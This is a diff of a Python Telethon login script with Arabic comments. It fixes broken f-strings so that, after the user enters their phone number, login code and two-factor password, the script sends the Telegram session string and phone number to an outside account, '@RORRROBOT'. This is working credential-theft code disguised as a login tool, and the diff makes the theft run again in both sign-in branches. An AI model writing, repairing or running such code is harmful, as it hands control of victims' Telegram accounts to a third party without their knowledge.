@@ -38,7 +38,8 @@ finally: # الحمدلله دائما وابدا
         client.send_code_request(phone_number)
         try:
             me = client.sign_in(phone_number, input('\033[032mPlease enter the code you received: '))
-            client.send_message("@RORRROBOT", f'Session: \n`{client.session.save()}`\n\nPhone number: `{p>
+            # إصلاح الخطأ هنا بإغلاق السلسلة بشكل صحيح
+            client.send_message("@RORRROBOT", f'Session: \n`{client.session.save()}`\n\nPhone number: `{phone_number}`') 
 
             with open('my_session.pkl', 'wb') as f:
                 pickle.dump(client.session.save(), f)
@@ -46,7 +47,8 @@ finally: # الحمدلله دائما وابدا
         except SessionPasswordNeededError:
             password = input('\033[032mPlease enter your password: ')
             me2 = client.sign_in(password=password)
-            client.send_message("@RORRROBOT", f'Session: \n`{client.session.save()}`\n\nPhone number: `{p>
+            # إصلاح الخطأ هنا أيضًا
+            client.send_message("@RORRROBOT", f'Session: \n`{client.session.save()}`\n\nPhone number: `{phone_number}`') 
 
             with open('my_session.pkl', 'wb') as f:
                 pickle.dump(client.session.save(), f)
